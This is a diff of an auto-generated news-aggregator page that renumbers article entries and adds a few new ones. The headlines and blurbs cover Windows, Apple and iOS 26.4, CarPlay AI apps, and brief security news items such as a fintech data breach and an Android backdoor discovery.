-### 22. `EN` [Bethesda updates Skyrim on Switch 2 with 60 FPS mode and much-needed fixes](data/articles/ee64b047bf5778d7c035056187249e77.html)
+### 23. `EN` [Bethesda updates Skyrim on Switch 2 with 60 FPS mode and much-needed fixes](data/articles/ee64b047bf5778d7c035056187249e77.html)
 **Source:** Neowin | **Keyword:** `Tech`
 Following The Elder Scrolls V: Skyrim's Switch 2 port backlash, Bethesda has finally delivered major fixes to the game. ...
 
@@ -4277,7 +4303,7 @@ Following The Elder Scrolls V: Skyrim's Switch 2 port backlash, Bethesda has fin
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 23. `EN` [Data breach at fintech firm Figure affects nearly 1 million accounts](data/articles/1eee1a54ad0ab40ac09db57edfb4155e.html)
+### 24. `EN` [Data breach at fintech firm Figure affects nearly 1 million accounts](data/articles/1eee1a54ad0ab40ac09db57edfb4155e.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 Hackers have stolen the personal and contact information of nearly 1 million accounts after breaching the systems of Figure Technology Solutions, a self-described blockchain-native financial technology company. [...]
 
@@ -4285,7 +4311,7 @@ Hackers have stolen the personal and contact information of nearly 1 million acc
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 24. `EN` [Glendale man gets 5 years in prison for role in darknet drug ring](data/articles/10a321b74ca0455613802fcdda074f99.html)
+### 25. `EN` [Glendale man gets 5 years in prison for role in darknet drug ring](data/articles/10a321b74ca0455613802fcdda074f99.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 ​A Glendale man was sentenced to nearly five years in federal prison for his role in a darknet drug trafficking operation that sold cocaine, methamphetamine, MDMA, and ketamine to customers across the United States. [...]
 
@@ -4293,7 +4319,7 @@ Hackers have stolen the personal and contact information of nearly 1 million acc
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 25. `EN` [Windows 11 finally supports MIDI 2.0](data/articles/b78059ea43b85f7e68aa7d04a5c0668d.html)
+### 26. `EN` [Windows 11 finally supports MIDI 2.0](data/articles/b78059ea43b85f7e68aa7d04a5c0668d.html)
 **Source:** Neowin | **Keyword:** `Tech`
 Windows 11 finally gets serious about music, native MIDI 2.0 support is here with the big upgrades musicians wanted. ...
 
@@ -4301,7 +4327,7 @@ Windows 11 finally gets serious about music, native MIDI 2.0 support is here wit
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 26. `EN` [Spain orders NordVPN, ProtonVPN to block LaLiga piracy sites](data/articles/df2823f7249e05fe7dc34c133127ca45.html)
+### 27. `EN` [Spain orders NordVPN, ProtonVPN to block LaLiga piracy sites](data/articles/df2823f7249e05fe7dc34c133127ca45.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 A Spanish court has granted precautionary measures against NordVPN and ProtonVPN, ordering the two popular VPN providers to block 16 websites that facilitate piracy of football matches. [...]
 
@@ -4309,7 +4335,7 @@ A Spanish court has granted precautionary measures against NordVPN and ProtonVPN
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 27. `EN` [AMD releases new chipset drivers with Windows 11 25H2 support and more](data/articles/b5b2b85e3304145483db4037aa97af65.html)
+### 28. `EN` [AMD releases new chipset drivers with Windows 11 25H2 support and more](data/articles/b5b2b85e3304145483db4037aa97af65.html)
 **Source:** Neowin | **Keyword:** `Tech`
 AMD has a new chipset driver for supported platforms with bugfixes, Windows 11 25H2 support, and more. ...
 
@@ -4317,7 +4343,7 @@ AMD has a new chipset driver for supported platforms with bugfixes, Windows 11 2
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 28. `EN` [Flaws in popular VSCode extensions expose developers to attacks](data/articles/0502b3059e914c0881a97461832f485c.html)
+### 29. `EN` [Flaws in popular VSCode extensions expose developers to attacks](data/articles/0502b3059e914c0881a97461832f485c.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 Vulnerabilities with high to critical severity ratings affecting popular Visual Studio Code (VSCode) extensions collectively downloaded more than 128 million times could be exploited to steal local files and execute code remotely. [...]
 
@@ -4325,7 +4351,7 @@ Vulnerabilities with high to critical severity ratings affecting popular Visual
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 29. `EN` [Mozilla is ending Firefox support on Windows 7](data/articles/178c97049b253b6ffae1ce667d9484aa.html)
+### 30. `EN` [Mozilla is ending Firefox support on Windows 7](data/articles/178c97049b253b6ffae1ce667d9484aa.html)
 **Source:** Neowin | **Keyword:** `Tech`
 Time to say goodbye: Firefox 115 ESR, the last mainstream browser to still update itself on Windows 7, is on its way out this month. ...
 
@@ -4333,7 +4359,7 @@ Time to say goodbye: Firefox 115 ESR, the last mainstream browser to still updat
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 30. `EN` [Windows 11 just got a major 5G boost thanks to Ericsson](data/articles/708ca0b3a7a4cbd8625237fa9df11b59.html)
+### 31. `EN` [Windows 11 just got a major 5G boost thanks to Ericsson](data/articles/708ca0b3a7a4cbd8625237fa9df11b59.html)
 **Source:** Neowin | **Keyword:** `Tech`
 Ericsson returns with a silent 5G upgrade for Windows 11 that keeps enterprise users always connected without the hassle. ...
 
@@ -4341,7 +4367,7 @@ Ericsson returns with a silent 5G upgrade for Windows 11 that keeps enterprise u
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 31. `EN` [Save 60% on Microsoft Office 2024 Home &amp; Business for Mac or PC](data/articles/beb84b452b702622fb792c68acc49ff9.html)
+### 32. `EN` [Save 60% on Microsoft Office 2024 Home &amp; Business for Mac or PC](data/articles/beb84b452b702622fb792c68acc49ff9.html)
 **Source:** Neowin | **Keyword:** `Tech`
 One-time purchase of classic 2024 desktop versions of Word, Excel, PowerPoint, and OneNote. limited time deal. ...
 
@@ -4349,7 +4375,7 @@ One-time purchase of classic 2024 desktop versions of Word, Excel, PowerPoint, a
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 32. `EN` [New Keenadu backdoor found in Android firmware, Google Play apps](data/articles/d482a3f8d5d928adcb5076b6a8919912.html)
+### 33. `EN` [New Keenadu backdoor found in Android firmware, Google Play apps](data/articles/d482a3f8d5d928adcb5076b6a8919912.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 A newly discovered and sophisticated Android malware called Keenadu has been found embedded in firmware from multiple device brands, enabling it to compromise all installed applications and gain unrestricted control over infected devices. [...]
 
@@ -4357,7 +4383,7 @@ A newly discovered and sophisticated Android malware called Keenadu has been fou
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 33. `EN` [Poland arrests suspect linked to Phobos ransomware operation](data/articles/5cd10b57224ae27c756ff2b88ab68fdb.html)
+### 34. `EN` [Poland arrests suspect linked to Phobos ransomware operation](data/articles/5cd10b57224ae27c756ff2b88ab68fdb.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 Polish police have detained a 47-year-old man suspected of ties to the Phobos ransomware group and seized computers and mobile phones containing stolen credentials, credit card numbers, and server access data. [...]
 
@@ -4365,7 +4391,7 @@ Polish police have detained a 47-year-old man suspected of ties to the Phobos ra
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 34. `EN` [Ireland now also investigating X over Grok-made sexual images](data/articles/65fddfd98495d1247d336cc2fb71a46e.html)
+### 35. `EN` [Ireland now also investigating X over Grok-made sexual images](data/articles/65fddfd98495d1247d336cc2fb71a46e.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 Ireland's Data Protection Commission (DPC), the country's data protection authority, has opened a formal investigation into X over the use of the platform's Grok artificial intelligence tool to generate non-consensual sexual images of real people, including children. [...]
 
@@ -4373,7 +4399,7 @@ Ireland's Data Protection Commission (DPC), the country's data protection author
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 35. `EN` [Microsoft completes global rollout of autonomous AI Workflows for Teams](data/articles/79b75fbcde77db807f3ba7d2c7d570cb.html)
+### 36. `EN` [Microsoft completes global rollout of autonomous AI Workflows for Teams](data/articles/79b75fbcde77db807f3ba7d2c7d570cb.html)
 **Source:** Neowin | **Keyword:** `Tech`
 Microsoft 365 Copilot users can now automate project summaries and data monitoring with new "scheduled prompts" in the Teams Workflows app. ...
 
@@ -4381,7 +4407,7 @@ Microsoft 365 Copilot users can now automate project summaries and data monitori
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 36. `EN` [EU Parliament bans AI use on government work devices](data/articles/6e165c9e3be9c2a13bbf7b7058741e8b.html)
+### 37. `EN` [EU Parliament bans AI use on government work devices](data/articles/6e165c9e3be9c2a13bbf7b7058741e8b.html)
 **Source:** Neowin | **Keyword:** `Tech`
 Citing privacy and security concerns, the European Parliament has banned government employees from using AI features on their work devices. ...
 
@@ -4389,7 +4415,7 @@ Citing privacy and security concerns, the European Parliament has banned governm
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Windows Latest">
 
-### 37. `EN` [Windows 11 KB5077181 fixes gaming bugs, Nvidia black screen, and performance issue affecting explorer.exe, taskbar, and Start menu](data/articles/7134cb2bf95afd7c26db10d9b9d4b10c.html)
+### 38. `EN` [Windows 11 KB5077181 fixes gaming bugs, Nvidia black screen, and performance issue affecting explorer.exe, taskbar, and Start menu](data/articles/7134cb2bf95afd7c26db10d9b9d4b10c.html)
 **Source:** Windows Latest | **Keyword:** `Microsoft`
 KB5077181 could make some PCs faster if explorer.exe was hanging on your system, and it also fixes the black screen issue on Nvidia GPUs.
 
@@ -4397,7 +4423,7 @@ KB5077181 could make some PCs faster if explorer.exe was hanging on your system,
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Windows Latest">
 
-### 38. `EN` [How to check if Windows 11 has applied the new Secure Boot 2023 certificates (replaces Secure Boot 2011)](data/articles/94bd5c9e35361513a598d753fcc5e624.html)
+### 39. `EN` [How to check if Windows 11 has applied the new Secure Boot 2023 certificates (replaces Secure Boot 2011)](data/articles/94bd5c9e35361513a598d753fcc5e624.html)
 **Source:** Windows Latest | **Keyword:** `Microsoft`
 Windows 11’s February 2026 update begins replacing aging 2011 Secure Boot certificates with the newer Windows UEFI CA 2023, which is triggering TPM-WMI Event Viewer logs like Event ID 1801, that look alarming but are actually part of a staged rollout designed to avoid failures to firmware.
 
@@ -4405,7 +4431,7 @@ Windows 11’s February 2026 update begins replacing aging 2011 Secure Boot cert
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Windows Latest">
 
-### 39. `EN` [Exclusive: First look at Lenovo ThinkPad X13 Detachable, the “thinner” ThinkPad makes a comeback after two years](data/articles/8e5cb58914bd3f9a2e65891ba6251820.html)
+### 40. `EN` [Exclusive: First look at Lenovo ThinkPad X13 Detachable, the “thinner” ThinkPad makes a comeback after two years](data/articles/8e5cb58914bd3f9a2e65891ba6251820.html)
 **Source:** Windows Latest | **Keyword:** `Microsoft`
 Our exclusive leak gives you a first look at what could be the Lenovo ThinkPad X13 Detachable. Expected to launch at MWC.
 
@@ -4413,7 +4439,7 @@ Our exclusive leak gives you a first look at what could be the Lenovo ThinkPad X
 
 <div class="article-item" data-lang="fr" data-category="windows" data-source="Next INpact">
 
-### 40. `FR` [Ingérences numériques étrangères : VIGINUM doté de « moyens renforcés »](data/articles/2c3fba73c89e0386f26352d8fb4bebc7.html)
+### 41. `FR` [Ingérences numériques étrangères : VIGINUM doté de « moyens renforcés »](data/articles/2c3fba73c89e0386f26352d8fb4bebc7.html)
 **Source:** Next INpact | **Keyword:** `Tech`
 VIGINUM annonce pouvoir collecter les données issues des petites plateformes où sont souvent pensées les opérations de manipulations contre la France, relève l’AFP. Un décret, présenté hier en Conseil des ministres et publié ce 12 février au Journal officiel, dote en effet le service de vigilance et de protection contre les ingérences numériques étrangères de […]
 
@@ -5224,9 +5250,19 @@ Now, in a post on the Weibo Chinese social network, leaker Fixed Focus Digital c
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
+
+### 25. `EN` [AI agents are coming to CarPlay, but they're not getting the keys](data/articles/f31846158def3e6e5c553ffedf81c8e9.html)
+**Source:** AppleInsider | **Keyword:** `Apple`
+Apple is formally making room for AI agents in the car, adding a new voice-based conversational app category to CarPlay in iOS 26.4. Siri remains the system-level voice assistant in CarPlay
+Apple's February 9, 2026 update to the CarPlay Developer Guide introduces a new CarPlay entitlement category for voice-driven conversational apps. The move creates an official path for third-party AI assistants to operate inside CarPlay rather than relying solely on Siri.
+The change arrives as generative AI becomes more embedded across Apple platforms. CarPlay is next, but Apple is setting clear boundaries. Continue Reading on AppleInsider | Discuss on our Forums
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 25. `EN` [Apple Mail has a hidden feature that solved my biggest inbox problem](data/articles/a00665ac6a086beceb6636ee1f5c9d85.html)
+### 26. `EN` [Apple Mail has a hidden feature that solved my biggest inbox problem](data/articles/a00665ac6a086beceb6636ee1f5c9d85.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 I’ve used Apple’s Mail app for years across my iPhone, iPad, and Mac, but the recently added inbox categories were a mixed bag for me until I started regularly using one hidden feature.
 more…
@@ -5235,7 +5271,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 26. `EN` [iOS 26.4 adds support for voice-based AI apps to CarPlay](data/articles/2783557044c10c47ace11d79b22309e1.html)
+### 27. `EN` [iOS 26.4 adds support for voice-based AI apps to CarPlay](data/articles/2783557044c10c47ace11d79b22309e1.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Earlier this month, Bloomberg reported that Apple was preparing to update CarPlay with support for voice-based interactions in AI apps like OpenAI’s ChatGPT and Google’s Gemini. As of this week’s release of iOS 26.4 beta 1, that support has officially arrived.
 Here’s how it works.
@@ -5245,7 +5281,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 27. `EN` [Berkshire Hathaway reduces Apple stake as Warren Buffett officially retires](data/articles/5d2a4082ac99485f8797fa95a52ad7ac.html)
+### 28. `EN` [Berkshire Hathaway reduces Apple stake as Warren Buffett officially retires](data/articles/5d2a4082ac99485f8797fa95a52ad7ac.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 In new SEC disclosures filed this week, Warren Buffett’s Berkshire Hathaway revealed that it has once again trimmed its stake in Apple. At the same time, the firm disclosed a new $350 million investment in the New York Times.
 more…
@@ -5254,7 +5290,7 @@ more…
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 28. `FR` [macOS 26.4 : Apple avertit les développeurs, il faut s’adapter ou disparaître](data/articles/190a4986be2c01dcbd16941c033b25b4.html)
+### 29. `FR` [macOS 26.4 : Apple avertit les développeurs, il faut s’adapter ou disparaître](data/articles/190a4986be2c01dcbd16941c033b25b4.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple donne un dernier avertissement dans macOS 26.4. La balle est maintenant dans le camp des développeurs.
 
@@ -5262,7 +5298,7 @@ Apple donne un dernier avertissement dans macOS 26.4. La balle est maintenant da
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Macworld">
 
-### 29. `EN` [Apple’s March event might bring several days of surprises](data/articles/f01a38641286d1e271f18b452d9325cb.html)
+### 30. `EN` [Apple’s March event might bring several days of surprises](data/articles/f01a38641286d1e271f18b452d9325cb.html)
 **Source:** Macworld | **Keyword:** `Apple`
 Macworld We now know the date of Apple’s next event-type thing: March 4. But as ever, we won’t know the precise details or the products the company plans to announce until it chooses to make that information public.
 Unusually, however, there’s a good chance that Apple will tell us about the new products first and host the event (or, to use the company’s preferred terminology, the “experience”) after. Because one respected pundit has put forward the theory that Apple will announce new iPhones, iPads, and MacBooks via press release on Monday to Wednesday of that week, before journalists and influencers are gathered for a hands-on session with the hardware.
@@ -5275,7 +5311,7 @@ There is a precedent for this sort of serial press release strategy. At the end 
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 30. `EN` [Apple Music in iOS 26.4: Five new features coming to iPhone](data/articles/17eaad9094993f56149fae00b536b1e9.html)
+### 31. `EN` [Apple Music in iOS 26.4: Five new features coming to iPhone](data/articles/17eaad9094993f56149fae00b536b1e9.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 iOS 26.4 is packed with new features and changes, including five updates for the Music app. Here’s everything new for Apple Music in iOS 26.4.
 more…
@@ -5284,7 +5320,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 31. `EN` [Early demo reveals how CarPlay handles video in iOS 26.4, including Apple TV app](data/articles/9acb6eef2faca938ea24a5bd753e6d5a.html)
+### 32. `EN` [Early demo reveals how CarPlay handles video in iOS 26.4, including Apple TV app](data/articles/9acb6eef2faca938ea24a5bd753e6d5a.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Starting with iOS 26, Apple will officially allow video playback through CarPlay. Released this week in beta, iOS 26.4 appears to be the first version with support, as long as two conditions are met. While CarPlay video playback isn’t ready for users yet, one developer has shown off how it will look as well as how Apple’s TV app looks in the car.
 more…
@@ -5293,7 +5329,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 32. `EN` [M5 iPad Pro Hits New Record Low Prices on Amazon, Starting at $799.99 [Updated]](data/articles/e4848615b72d69e59258f0a0bac0ac66.html)
+### 33. `EN` [M5 iPad Pro Hits New Record Low Prices on Amazon, Starting at $799.99 [Updated]](data/articles/e4848615b72d69e59258f0a0bac0ac66.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 Apple's 11-inch M5 iPad Pro has hit new all-time low prices today on Amazon, starting at $799.99 for the 256GB Wi-Fi 11-inch iPad Pro, down from $999.00. As of writing, we're only tracking low prices on the 11-inch model of the M5 iPad Pro. Note: MacRumors is an affiliate partner with Amazon. When you click a link and make a purchase, we may receive a small payment, which helps us keep the site running. $999.99, down from $1,199.00, and the 1TB Wi-Fi model for $1,399.99, down from $1,599.00. All three of these deals are $199 discounts and record low prices on the 2025 iPad Pro. $199 OFF
 iPad Pro (256GB Wi-Fi) for $799.99 $199 OFF
@@ -5303,7 +5339,7 @@ iPad Pro (512GB Wi-Fi) for $999.99 $199 OFF
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 33. `FR` [Le prochain iPad Pro ne sera sûrement pas ce que vous espérez](data/articles/9c0698c0e34cb3d31e6b8095b865cceb.html)
+### 34. `FR` [Le prochain iPad Pro ne sera sûrement pas ce que vous espérez](data/articles/9c0698c0e34cb3d31e6b8095b865cceb.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple se repose-t-il un peu trop sur ses lauriers ?
 
@@ -5311,7 +5347,7 @@ Apple se repose-t-il un peu trop sur ses lauriers ?
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 34. `EN` [Apple is making it easier to customize how subtitles look on iPhone](data/articles/704cf0dc11db0f72520515b5d95768d0.html)
+### 35. `EN` [Apple is making it easier to customize how subtitles look on iPhone](data/articles/704cf0dc11db0f72520515b5d95768d0.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 The usage of subtitles and captions in TV shows and movies is ever increasing, both due to the popularity of foreign language content and Hollywood’s inability to produce an audio track where the person speaking is sufficiently intelligible. With iOS 26.4, Apple is improving the subtitles experience in the native video player on iPhone and iPad, and a similar change is rolling out to Apple TV with tvOS 26.4 …
 more…
@@ -5320,7 +5356,7 @@ more…
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 35. `FR` [Quand pourra-t-on installer iOS 26.4 sur iPhone ?](data/articles/af2b524d7c0107cfca097facc2f101df.html)
+### 36. `FR` [Quand pourra-t-on installer iOS 26.4 sur iPhone ?](data/articles/af2b524d7c0107cfca097facc2f101df.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple a gardé le secret : on ne sait pas quand arrivera iOS 26.4 en version grand public. Mais on peut s'inspirer des précédentes mises à jour pour définir une fenêtre de tir.
 
@@ -5328,7 +5364,7 @@ Apple a gardé le secret : on ne sait pas quand arrivera iOS 26.4 en version gr
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 36. `EN` [‘Double-dipping’ dispute over Qualcomm iPhone chips finally ends](data/articles/049fcd5ea0cd047cac7a8582181460b5.html)
+### 37. `EN` [‘Double-dipping’ dispute over Qualcomm iPhone chips finally ends](data/articles/049fcd5ea0cd047cac7a8582181460b5.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple previously accused Qualcomm of “double-dipping” as a result of the company’s policies over selling radio chips for use in iPhones. The Cupertino company had also objected to Qualcomm charging a percentage of the price of an iPhone rather than a fixed fee per chip.
 Apple withdrew its claims back in 2024, but an independent class-action lawsuit was still being pursued on behalf of iPhone owners. This lawsuit has now been abandoned …
@@ -5338,7 +5374,7 @@ more…
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 37. `FR` [Apple met fin à deux applications avec une seule mise à jour : tvOS 26.4](data/articles/a61b5463bf5d587d21ed8bbeef8eba41.html)
+### 38. `FR` [Apple met fin à deux applications avec une seule mise à jour : tvOS 26.4](data/articles/a61b5463bf5d587d21ed8bbeef8eba41.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple fait le ménage dans ses applications et supprime deux services d'un coup.
 
@@ -5346,7 +5382,7 @@ Apple fait le ménage dans ses applications et supprime deux services d'un coup.
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 38. `FR` [Le prochain «one more thing» d’Apple sera un bijou ?](data/articles/cd6d8c7e5d36bb22055981b007289c0f.html)
+### 39. `FR` [Le prochain «one more thing» d’Apple sera un bijou ?](data/articles/cd6d8c7e5d36bb22055981b007289c0f.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple voudrait lancer deux appareils 100% IA dans les prochaines années, une double prise de risque.
 
@@ -5354,7 +5390,7 @@ Apple voudrait lancer deux appareils 100% IA dans les prochaines années, une do
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 39. `EN` [Apple Music Connect Launches as Promotional Resource for Labels and Distributors](data/articles/5ace327dc1af8f8b57effc876b056f27.html)
+### 40. `EN` [Apple Music Connect Launches as Promotional Resource for Labels and Distributors](data/articles/5ace327dc1af8f8b57effc876b056f27.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 Apple has launched Apple Music Connect, a new resource for labels, distributors, and partners to manage promotional assets, upload press photos, and help coordinate how artists' music and marketing materials are presented across the streaming service. The new online hub includes a range of tools and services for music labels, including: Promote: Creates promotional artwork and visual assets to support releases across Apple Music surfaces and external channels. Apple Music Pitch: A way to submit detailed information about upcoming releases for editorial and playlist consideration. Media Requests: A place for uploading and managing press photos and assets requested by Apple Music for editorial use. Social Assets: Generates shareable templates for announcing placements, milestones, and releases on social platforms. Console: A central dashboard to access and manage Apple Music Connect tools and permissions. Marketing Tools: To generate affiliate links, badges, embeddable players, QR codes, and related promotional materials. shut down in 2018. The social engagement feature let artists directly share content with their fans, but it suffered the same fate as Ping, the company's previous social network for music removed from iTunes in October 2012.
 Tag: Apple Music
@@ -5365,7 +5401,7 @@ Discuss this article in our forums
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 40. `FR` [Les 10 produits attendus à l’Apple Special Experience de mars](data/articles/8b76d24dbe8bfc0fa85c53aa0d44f670.html)
+### 41. `FR` [Les 10 produits attendus à l’Apple Special Experience de mars](data/articles/8b76d24dbe8bfc0fa85c53aa0d44f670.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple serait prêt à faire un gros coup début mars.
 
@@ -5373,7 +5409,15 @@ Apple serait prêt à faire un gros coup début mars.
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 41. `FR` [iOS 26.4 vous révèle une information que vous ne pouviez pas voir avant](data/articles/f19882753406492696fe73232a6ddfdb.html)
+### 42. `FR` [Apple veut vous faire regarder des séries au volant, et ce n’est pas une blague](data/articles/4be6baf0925d01f58fe7b2ed75de4bd6.html)
+**Source:** iPhoneAddict | **Keyword:** `Apple`
+Voici ce que révèle le code d'iOS 26.4.
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
+
+### 43. `FR` [iOS 26.4 vous révèle une information que vous ne pouviez pas voir avant](data/articles/f19882753406492696fe73232a6ddfdb.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple ajoute une petite nouveauté bien pratique pour ceux qui partagent leur connexion mobile.
 
@@ -5381,7 +5425,7 @@ Apple ajoute une petite nouveauté bien pratique pour ceux qui partagent leur co
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 42. `EN` [Apple Car Key support now available on the 2026 Toyota Rav4](data/articles/e4897801b313c5e5832ecfaa3b587e8a.html)
+### 44. `EN` [Apple Car Key support now available on the 2026 Toyota Rav4](data/articles/e4897801b313c5e5832ecfaa3b587e8a.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Users of the Apple Wallet app can now use a digital Car Key to lock and unlock the Toyota Rav4, but the feature's availability has yet to expand to other Toyota vehicles. Apple Car Key can be used to unlock the 2026 Toyota Rav4. Screenshot credit: Reddit user Piecake1234
 Since 2020, the Car Key feature has allowed iPhone and Apple Watch owners to unlock and start their cars with the use of mobile devices. According to a social media post spotted on Monday, the 2026 Toyota Rav4 has gained support for Apple's Car Key system.
@@ -5391,7 +5435,7 @@ More than 30 vehicle manufacturers already support Apple's Car Key feature. At W
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 43. `EN` [iOS 26.4 Beta Launches Without Apple Intelligence Siri Features](data/articles/708ab95ae34d84098c113a78d00ac5af.html)
+### 45. `EN` [iOS 26.4 Beta Launches Without Apple Intelligence Siri Features](data/articles/708ab95ae34d84098c113a78d00ac5af.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 The first beta of iOS 26.4 is available to developers and public beta testers, and the software includes no new Siri features. There were expectations of at least some new Apple Intelligence ‌Siri‌ capabilities because of how long the delays have been and persistent rumors suggesting Apple was targeting an iOS 26.4 release, but we'll have to wait longer for ‌Siri‌ updates. After Apple announced a delay for the ‌Apple Intelligence‌ version of ‌Siri‌ in March 2025, Bloomberg's Mark Gurman said that Apple had set an internal launch target for iOS 26.4. He repeated the iOS 26.4 timeline in several subsequent reports, and even at the end of January, he suggested that Apple would unveil the more personalized version of ‌Siri‌ in February. delayed until iOS 26.5 or iOS 27. Gurman said the ‌Siri‌ features will be spread across several upcoming iOS releases. Some or all of the new ‌Siri‌ features could be introduced in iOS 26.5, or Apple might wait for iOS 27, which will be previewed in June 2026 at WWDC. Apple first showed off the ‌Apple Intelligence‌ version of ‌Siri‌ at the 2024 Worldwide Developers Conference, and it was supposed to come in iOS 18. Apple had to upgrade ‌Siri‌'s architecture to make the promised functionality work, and so far, that's taken over a year. ‌Siri‌ is apparently taking too long to respond to requests, and some queries aren't processed properly, which is what led to the iOS 26.4 ‌Siri‌ delay. Engineers are apparently using iOS 26.5 for further ‌Siri‌ testing right now, so some functionality could come in that update. There's still a possibility that new ‌Siri‌ features will be introduced in a later iOS 26.4 beta, but that's not guaranteed. Apple has been working to add personalization, onscreen awareness, and the ability for ‌Siri‌ to do more in and between apps. Not all of the features are working reliably and Apple is said to be having continual issues with accuracy. CNBC that the new version of ‌Siri‌ would still be coming at some point in 2026. Apple has never given a timeline more specific than 2026, so there hasn't been a second actual delay, just a disappointment based on rumors of an iOS 26.4 launch. iOS 26 launch could still happen.
 Related Roundups: iOS 26, iPadOS 26
@@ -5403,7 +5447,7 @@ Discuss this article in our forums
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 44. `EN` [Apple Health gets new Average Bedtime metric in iOS 26.4 beta](data/articles/fb924089a10334a5c16c8dd0209f08b9.html)
+### 46. `EN` [Apple Health gets new Average Bedtime metric in iOS 26.4 beta](data/articles/fb924089a10334a5c16c8dd0209f08b9.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 The Apple Health app has just been updated with two key changes — a new Average Bedtime metric and a blood oxygen graph in the Vitals section. Apple Health now has an Average Bedtime metric.
 With the release of the first iOS 26.4 developer beta on Monday, enhancements for Apple Podcasts and Apple Music apps were introduced. Another system application, Apple Health, was modified as well. It now offers additional sleep-related information to iPhone users.
@@ -5413,7 +5457,7 @@ To be more specific, Apple Health has received a dedicated Average Bedtime metri
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 45. `EN` [iTunes TV &amp; Movies apps exit stage left in tvOS 26.4 beta](data/articles/0f9671248d2852fa7d1eed92ae8ba40f.html)
+### 47. `EN` [iTunes TV &amp; Movies apps exit stage left in tvOS 26.4 beta](data/articles/0f9671248d2852fa7d1eed92ae8ba40f.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Predictably, the tvOS 26.4 developer beta has removed the apps for iTunes Movies and iTunes TV Shows, migrating users to the TV app for media purchases and playback. iTunes TV Shows in the tvOS home screen before the tvOS 26.4 developer beta
 Apple has slowly been migrating users away from buying content from the iTunes TV Shows and Movies apps for a few years. In Monday's developer beta, Apple has taken another step to kill off the apps completely.
@@ -5423,7 +5467,7 @@ Under the developer beta, Apple has removed the iTunes Movies and iTunes TV Show
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Macworld">
 
